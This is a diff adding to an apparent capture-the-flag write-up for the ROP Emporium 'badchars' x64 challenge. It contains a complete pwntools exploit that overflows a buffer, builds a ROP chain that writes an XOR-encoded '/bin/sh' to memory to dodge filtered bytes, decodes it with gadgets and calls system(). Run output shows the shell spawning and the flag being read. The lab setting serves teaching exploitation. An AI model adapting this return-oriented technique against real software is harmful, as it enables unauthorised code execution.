@@ -642,3 +642,136 @@ Non-debugging symbols:
 0x0000000000400bc0  __libc_csu_fini
 0x0000000000400bc4  _fini
 ```
+### Exploit (launch /bin/sh)
+```
+# Import the library
+from pwn import *
+
+# Debugging
+#context.log_level = 'debug'
+context.arch = 'amd64'
+
+# Binary has NX set - no typical BOF - 
+# Help info: http://docs.pwntools.com/en/stable/intro.html
+
+elf = ELF("badchars")
+
+# Bad chars:
+# badchars are: b i c / <space> f n s
+badchars = 'bic/ fns'
+badchar_hex = [hex(ord(x)) for x in badchars]
+# Xord result: ['l', '!', '*', '-', 'l', '0', '+']
+xord_string = [chr(ord(x) ^ 0x43) for x in '/bin/sh']
+# Reverse result: '/bin/sh'
+backtostring = ''.join([chr(ord(x) ^ 0x43) for x in xord_string])
+
+# Variables
+# Section to write data, readelf -a ./write4;readelf -x .data ./write4
+writeWhatWhere = p64(0x00000000006010d0)
+
+# String to execute with the system function
+stringToWrite = "l!*-l0+\x00"
+
+# Pop gadget: 0x0000000000400b3b : pop r12 ; pop r13 ; ret
+popGadget = p64(0x0000000000400b3b)
+
+# mov gadget: 0x0000000000400b34 : mov qword ptr [r13], r12 ; ret
+movGadget = p64(0x0000000000400b34)
+
+# Xor: 0x400b30 <usefulGadgets>       xor    byte ptr [r15], r14b; ret
+xor = p64(0x400b30)
+
+# 0x400b40 <usefulGadgets+16>    pop    r14; pop     r15;    ret
+xorpop = p64(0x400b40)
+
+# Poprdi gadget: 0x0000000000400b39 : pop rdi ; ret
+poprdiGadget = p64(0x0000000000400b39)
+
+# System function:
+system = p64(elf.symbols["system"])
+
+
+# Generate our payload
+#
+payload = "a" * 40
+
+# Push our Xor'd payload onto the stack
+payload += popGadget
+payload += stringToWrite  # r12
+payload += writeWhatWhere # r13
+
+# Move it to our memory address
+payload += movGadget
+
+# Xor the first char
+payload += xorpop
+payload += p64(0x43) # r14b Our XOR key
+payload += writeWhatWhere # r15 the destination address
+payload += xor
+
+# Xor the second char
+payload += xorpop
+payload += p64(0x43) # r14b Our XOR key
+payload += p64(0x00000000006010d1) # r15 the destination address
+payload += xor
+
+# Xor the third char
+payload += xorpop
+payload += p64(0x43) # r14b Our XOR key
+payload += p64(0x00000000006010d2) # r15 the destination address
+payload += xor
+
+# Xor the fourth char
+payload += xorpop
+payload += p64(0x43) # r14b Our XOR key
+payload += p64(0x00000000006010d3) # r15 the destination address
+payload += xor
+
+# Xor the fifth char
+payload += xorpop
+payload += p64(0x43) # r14b Our XOR key
+payload += p64(0x00000000006010d4) # r15 the destination address
+payload += xor
+
+# Xor the sixth char
+payload += xorpop
+payload += p64(0x43) # r14b Our XOR key
+payload += p64(0x00000000006010d5) # r15 the destination address
+payload += xor
+
+# Xor the seventh char
+payload += xorpop
+payload += p64(0x43) # r14b Our XOR key
+payload += p64(0x00000000006010d6) # r15 the destination address
+payload += xor
+
+# Pop RDI Gadget and the memory address into registers
+payload += poprdiGadget
+payload += writeWhatWhere
+# Call system with our pointers in the correct registers.
+payload += system
+
+io = elf.process()
+#gdb.attach(io)
+io.sendline(payload)
+io.interactive()
+```
+### Result (launch /bin/sh)
+```
+[root:~/Downloads/RopEmporium]# python exploit-badchars-x64-binsh.py 
+[*] '/root/Downloads/RopEmporium/badchars'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process '/root/Downloads/RopEmporium/badchars': pid 17851
+[*] Switching to interactive mode
+badchars by ROP Emporium
+64bits
+
+badchars are: b i c / <space> f n s
+> $ cat flag.txt
+ROPE{a_placeholder_32byte_flag!}
+$  
+```
